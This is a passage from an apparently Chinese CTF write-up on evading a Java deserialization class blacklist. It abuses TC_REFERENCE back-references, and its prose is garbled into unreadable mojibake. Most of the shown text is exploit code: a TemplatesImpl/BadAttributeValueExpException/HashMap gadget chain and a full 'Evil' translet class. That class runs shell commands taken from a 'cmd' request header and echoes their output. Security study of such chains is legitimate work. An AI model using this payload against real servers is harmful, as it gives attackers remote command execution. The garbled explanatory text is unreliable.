class="line">&#123;</span><br><span class="line">    <span class="type">byte</span> <span class="variable">tc</span> <span class="operator">=</span> bin.peekByte();</span><br><span class="line">    <span class="keyword">switch</span> (tc) &#123;</span><br><span class="line">        <span class="keyword">case</span> TC_NULL:</span><br><span class="line">            <span class="keyword">return</span> (ObjectStreamClass) readNull();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> TC_REFERENCE:</span><br><span class="line">            <span class="keyword">return</span> (ObjectStreamClass) readHandle(unshared);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> TC_PROXYCLASSDESC:</span><br><span class="line">            <span class="keyword">return</span> readProxyDesc(unshared);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> TC_CLASSDESC:</span><br><span class="line">            <span class="keyword">return</span> readNonProxyDesc(unshared);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StreamCorruptedException</span>(</span><br><span class="line">                String.format(<span class="string">&quot;invalid type code: %02X&quot;</span>, tc));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>TC_NULLè¡¨ç¤ºçš„æ˜¯nullï¼ŒåŸºæœ¬æ— ç”¨å¤„ï¼Œå‰©ä½™çš„TC_REFERENCEã€TC_PROXYCLASSDESCä¼šç»§ç»­å¯»æ‰¾ç±»çš„æè¿°ç¬¦ï¼Œä¸”å¤„ç†é€»è¾‘éƒ½ä¼šå…ˆè°ƒç”¨resolveClassæ¥åˆ¤æ–­è¯¥ç±»æ˜¯ä¸æ˜¯NULLï¼Œå¤§å¤šæ•°æƒ…å†µéƒ½ä¼šåƒTC_CLASSDESCåˆ†æ”¯ä¸€æ ·æœ€åè¿›å…¥åˆ°resolveClassæ–¹æ³•ä¸­ï¼Œä¸‹é¢åˆ†æä¸€ä¸‹è°ƒç”¨é€»è¾‘</p></blockquote><p>è·Ÿè¿›TC_CLASSDESCåˆ†æ”¯çš„readNonProxyDescæ–¹æ³•</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> ObjectStreamClass <span class="title function_">readNonProxyDesc</span><span class="params">(<span class="type">boolean</span> unshared)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (bin.readByte() != TC_CLASSDESC) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InternalError</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectStreamClass</span> <span class="variable">desc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectStreamClass</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">descHandle</span> <span class="operator">=</span> handles.assign(unshared ? unsharedMarker : desc);</span><br><span class="line">        passHandle = NULL_HANDLE;</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectStreamClass</span> <span class="variable">readDesc</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            readDesc = readClassDescriptor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> (IOException) <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(</span><br><span class="line">                <span class="string">&quot;failed to read class descriptor&quot;</span>).initCause(ex);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; cl = <span class="literal">null</span>;</span><br><span class="line">        <span class="type">ClassNotFoundException</span> <span class="variable">resolveEx</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        bin.setBlockDataMode(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">checksRequired</span> <span class="operator">=</span> isCustomSubclass();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> ((cl = resolveClass(readDesc)) == <span class="literal">null</span>) &#123;<span class="comment">//ğŸŒŸğŸŒŸ</span></span><br><span class="line">                resolveEx = <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(<span class="string">&quot;null class&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (checksRequired) &#123;</span><br><span class="line">                ReflectUtil.checkPackageAccess(cl);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">            resolveEx = ex;</span><br><span class="line">        &#125;</span><br><span class="line">        skipCustomData();</span><br><span class="line"></span><br><span class="line">        desc.initNonProxy(readDesc, cl, resolveEx, readClassDesc(<span class="literal">false</span>));</span><br><span class="line"></span><br><span class="line">        handles.finish(descHandle);</span><br><span class="line">        passHandle = descHandle;</span><br><span class="line">        <span class="keyword">return</span> desc;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>TC_REFERENCEã€TC_PROXYCLASSDESCåˆ†æ”¯ä¸­è°ƒç”¨çš„å‡½æ•°ä¹Ÿæœ‰ç±»ä¼¼çš„è°ƒç”¨resolveClassæ–¹æ³•çš„é€»è¾‘</p></blockquote><p>å› æ­¤æ‰€æœ‰ä¼ å…¥ä»¥ååºåˆ—åŒ–çš„æ•°æ®æµéƒ½ä¸å¯é¿å…çš„ä¼šæµå…¥è¢«é¢˜ç›®secObjectInputStreamç±»é‡å†™çš„resolveClassæ–¹æ³•ä¸­</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">protected</span> Class <span class="title function_">resolveClass</span><span class="params">(ObjectStreamClass cls)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">      <span class="keyword">if</span>(!contains(cls.getName())) &#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="built_in">super</span>.resolveClass(cls);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(<span class="string">&quot;You can&#x27;t use class&quot;</span>, cls.getName());</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">contains</span><span class="params">(String targetValue)</span> &#123;</span><br><span class="line">      <span class="keyword">for</span> (String forbiddenPackage : blacklist) &#123;</span><br><span class="line">         <span class="keyword">if</span> (targetValue.matches(forbiddenPackage))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>containsæ–¹æ³•ä¼šæ£€æµ‹æ˜¯å¦åŒ…å«é»‘åå•ä¸­çš„ç±»</p></blockquote><p>ä½†æ˜¯æƒ³è¦ç»•å¼€resolveClassæ¥ååºåˆ—åŒ–è¿˜æ˜¯æœ‰å¯èƒ½çš„ï¼Œå›åˆ°ä¹‹å‰çš„</p><p><code>java.io.ObjectInputStream#readObject0</code>æ–¹æ³•ï¼Œç”±äºreadClassDescæ–¹æ³•ä¼šèµ°å‘resolveClassï¼Œå› æ­¤è¦é€‰æ‹©åˆ†æ”¯ä¸­æ–¹æ³•åç»­ä¸ä¼šè°ƒç”¨readClassDescçš„ï¼Œç¬¦åˆçš„åˆ†æ”¯æœ‰TC_NULL<code>ã€</code>TC_REFERENCE<code>ã€</code>TC_STRING<code>ã€</code>TC_LONGSTRING<code>ã€</code>TC_EXCEPTION ï¼Œstringä¸nullè¿™ç§å¯¹æˆ‘ä»¬æ¯«æ— ç”¨å¤„çš„ï¼Œexceptionç±»å‹åˆ™æ˜¯è§£å†³åºåˆ—åŒ–ç»ˆæ­¢ç›¸å…³ï¼Œå› æ­¤æˆ‘ä»¬åªå‰©ä¸‹å¼•ç”¨ç±»å‹è¿™ä¸€ä¸ªé€‰æ‹©ï¼Œåªè¦è®©æˆ‘ä»¬çš„æ¶æ„ç±»æˆä¸ºå¼•ç”¨ç±»å‹ï¼Œå°±èƒ½è®©å…¶ç»•è¿‡resolveClassçš„æ£€æŸ¥</p><h3 id="å¼•ç”¨ç±»å‹"><a href="#å¼•ç”¨ç±»å‹" class="headerlink" title="å¼•ç”¨ç±»å‹"></a>å¼•ç”¨ç±»å‹</h3><p>åœ¨Listã€setã€mapç±»å‹ä¸­æ·»åŠ åŒæ ·å¯¹è±¡æ—¶ï¼Œä¸ºèŠ‚çœèµ„æºï¼Œç¬¬äºŒä¸ªåŠ å…¥çš„å¯¹è±¡ä¼šæ”¹æˆç¬¬ä¸€ä¸ªå¯¹è±¡çš„å¼•ç”¨ï¼Œä»¥ArrayListä¸ºä¾‹,å†™ä¸€ä¸ªç®€å•çš„demo</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        ArrayList&lt;Object&gt; arrayList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        arrayList.add(templates);</span><br><span class="line">        arrayList.add(templates);</span><br><span class="line">        ByteArrayOutputStream by=<span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        ObjectOutputStream a=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(by);</span><br><span class="line">        a.writeObject(arrayList);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>è¿™é‡Œç›´æ¥è·Ÿè¿›ä¸€ä¸‹ArrayListçš„writeObjectæ–¹æ³•</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException&#123;</span><br><span class="line">    <span class="comment">// Write out element count, and any hidden stuff</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">expectedModCount</span> <span class="operator">=</span> modCount;</span><br><span class="line">    s.defaultWriteObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Write out size as capacity for behavioural compatibility with clone()</span></span><br><span class="line">    s.writeInt(size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Write out all elements in the proper order.</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;size; i++) &#123;</span><br><span class="line">        s.writeObject(elementData[i]);<span class="comment">//ğŸŒŸğŸŒŸListä¸­çš„æ¯ä¸ªå…ƒç´ åˆ†åˆ«writeObject</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (modCount != expectedModCount) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConcurrentModificationException</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>è·Ÿè¿›åˆ°<code>ObjectOutputStream#writeObject</code> -&gt; <code>ObjectOutputStream#writeObject0</code></p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject0</span><span class="params">(Object obj, <span class="type">boolean</span> unshared)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">oldMode</span> <span class="operator">=</span> bout.setBlockDataMode(<span class="literal">false</span>);</span><br><span class="line">        depth++;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// handle previously written and non-replaceable objects</span></span><br><span class="line">            <span class="type">int</span> h;</span><br><span class="line">            <span class="keyword">if</span> ((obj = subs.lookup(obj)) == <span class="literal">null</span>) &#123;</span><br><span class="line">                writeNull();</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!unshared &amp;&amp; (h = handles.lookup(obj)) != -<span class="number">1</span>) &#123;<span class="comment">//ğŸŒŸğŸŒŸåœ¨handlesæŸ¥è¯¢è¿™ä¸ªå¯¹è±¡æ˜¯å¦è¢«åºåˆ—åŒ–è¿‡</span></span><br><span class="line">                writeHandle(h);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Class) &#123;</span><br><span class="line">                writeClass((Class) obj, unshared);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> ObjectStreamClass) &#123;</span><br><span class="line">                writeClassDesc((ObjectStreamClass) obj, unshared);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">//.....</span></span><br><span class="line">          </span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><blockquote><p>å¦‚æœä¸Šè¿°æŸ¥æ‰¾åå‘ç°è¿™ä¸ªæ˜¯ä¸ªä¹‹å‰æ²¡è¢«åºåˆ—åŒ–çš„æ–°å¯¹è±¡ï¼Œä¹‹åä¼šè¿›å…¥åˆ°writeNonProxyDescè¿›è€ŒæŠŠæ–°å¯¹è±¡åŠ å…¥åˆ°handlesè¿™ä¸ªHashTableä¸­<br>å…·ä½“è°ƒç”¨é“¾</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202311292216942.png"                      alt="image-20231129182815527"                ><figcaption>image-20231129182815527</figcaption></figure></p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202311292216845.png"                      alt="image-20231129182829338"                ><figcaption>image-20231129182829338</figcaption></figure></p></blockquote><p>å› æ­¤ç¬¬äºŒä¸ªåºåˆ—åŒ–åŒä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œä¼šç›´æ¥æ»¡è¶³</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (!unshared &amp;&amp; (h = handles.lookup(obj)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                writeHandle(h);</span><br><span class="line">                <span class="keyword">return</span>;&#125;</span><br></pre></td></tr></table></figure></div><p>è·Ÿè¿›writeHandlem,å¯ä»¥å‘ç°è¢«è®°å½•ä¸ºå¼•ç”¨ç±»å‹</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeHandle</span><span class="params">(<span class="type">int</span> handle)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    bout.writeByte(TC_REFERENCE);</span><br><span class="line">    bout.writeInt(baseWireHandle + handle);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>è‡³æ­¤ï¼Œåˆ©ç”¨å¼•ç”¨ç±»å‹æˆåŠŸç»•è¿‡äº†resolveClassçš„æ£€æŸ¥ï¼Œå¤§æ¦‚expå¦‚ä¸‹é¢çš„ä¼ªä»£ç </p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">setValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;ClassPool.getDefault().get(Evil.class.getName()).toBytecode()&#125;);</span><br><span class="line">setValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;sloth&quot;</span>);</span><br><span class="line">setValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">JSONArray</span> <span class="variable">jsonArray</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">jsonArray.add(templates);<span class="comment">//ç¬¬ä¸€æ¬¡åŠ å…¥</span></span><br><span class="line"></span><br><span class="line"><span class="type">BadAttributeValueExpException</span> <span class="variable">bd</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">setValue(bd,<span class="string">&quot;val&quot;</span>,jsonArray);</span><br><span class="line"></span><br><span class="line"><span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">hashMap.put(templates,bd);<span class="comment">//ç¬¬äºŒæ¬¡åŠ å…¥æ„é€ å¼•ç”¨ç±»å‹</span></span><br><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">objectOutputStream.writeObject(hashMap);</span><br><span class="line"><span class="type">byte</span>[] bytes1 = byteArrayOutputStream.toByteArray();</span><br><span class="line">System.out.println(base64Encode(bytes1));</span><br><span class="line">objectOutputStream.close();</span><br></pre></td></tr></table></figure></div><h2 id="0x02-exp"><a href="#0x02-exp" class="headerlink" title="0x02 exp"></a>0x02 exp</h2><h3 id="ä¸å‡ºç½‘"><a href="#ä¸å‡ºç½‘" class="headerlink" title="ä¸å‡ºç½‘"></a>ä¸å‡ºç½‘</h3><p>ç”±äºæ­¤é¢˜ä¸å‡ºç½‘ï¼Œæ¯”è¾ƒå¸¸è§çš„æ€è·¯æ˜¯æ‰“å†…å­˜é©¬ï¼Œä½†æ˜¯è¿™é¢˜æœ‰ä¸€ä¸ªAgentå®æ—¶æ‰«æï¼ˆsuagent-loader.jarï¼‰</p><p>å†åŠ ä¸Šæ­¤é¢˜æ³¨å…¥å†…å­˜é©¬ä¼šå› ä¸ºä¸€ä¸ªNullPointerExceptionè€Œæå‰ç»ˆæ­¢ï¼Œæ”¹ä¸ºç”¨æ— æ–‡ä»¶ç›´æ¥å›æ˜¾ï¼Œä½¿ç”¨çš„æ—¶å€™éœ€è¦åœ¨è¯·æ±‚æŠ¥æ–‡ä¸­åŠ å…¥header cmd: å‘½ä»¤</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Evil</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;org.springframework.web.context.request.RequestContextHolder&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;getRequestAttributes&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> m.invoke(<span class="literal">null</span>);</span><br><span class="line">        c = Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;org.springframework.web.context.request.ServletRequestAttributes&quot;</span>);</span><br><span class="line">        m = c.getMethod(<span class="string">&quot;getResponse&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">m1</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;getRequest&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">resp</span> <span class="operator">=</span> m.invoke(o);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">req</span> <span class="operator">=</span> m1.invoke(o); <span class="comment">// HttpServletRequest</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">getWriter</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;javax.servlet.ServletResponse&quot;</span>).getDeclaredMethod(<span class="string">&quot;getWriter&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getHeader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;javax.servlet.http.HttpServletRequest&quot;</span>).getDeclaredMethod(<span class="string">&quot;getHeader&quot;</span>,String.class);</span><br><span class="line">        getHeader.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        getWriter.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">writer</span> <span class="operator">=</span> getWriter.invoke(resp);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> (String)getHeader.invoke(req, <span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        String[] commands = <span class="keyword">new</span> <span class="title class_">String</span>[<span class="number">3</span>];</span><br><span class="line">        <span class="type">String</span> <span class="variable">charsetName</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;window&quot;</span>) ? <span class="string">&quot;GBK&quot;</span>:<span class="string">&quot;UTF-8&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (System.getProperty(<span class="string">&quot;os.name&quot;</span>).toUpperCase().contains(<span class="string">&quot;WIN&quot;</span>)) &#123;</span><br><span class="line">            commands[<span class="number">0</span>] = <span class="string">&quot;cmd&quot;</span>;</span><br><span class="line">            commands[<span class="number">1</span>] = <span class="string">&quot;/c&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            commands[<span class="number">0</span>] = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">            commands[<span class="number">1</span>] = <span class="string">&quot;-c&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        commands[<span class="number">2</span>] = cmd;</span><br><span class="line">        writer.getClass().getDeclaredMethod(<span class="string">&quot;println&quot;</span>, String.class).invoke(writer, <span class="keyword">new</span> <span class="title class_">Scanner</span>(Runtime.getRuntime().exec(commands).getInputStream(),charsetName).useDelimiter(<span class="string">&quot;\\A&quot;</span>).next());</span><br><span class="line">        writer.getClass().getDeclaredMethod(<span class="string">&quot;flush&quot;</span>).invoke(writer);</span><br><span class="line">        writer.getClass().getDeclaredMethod(<span class="string">&quot;close&quot;</span>).invoke(writer);</span><br><span class="line">    &#125;</span><br><span 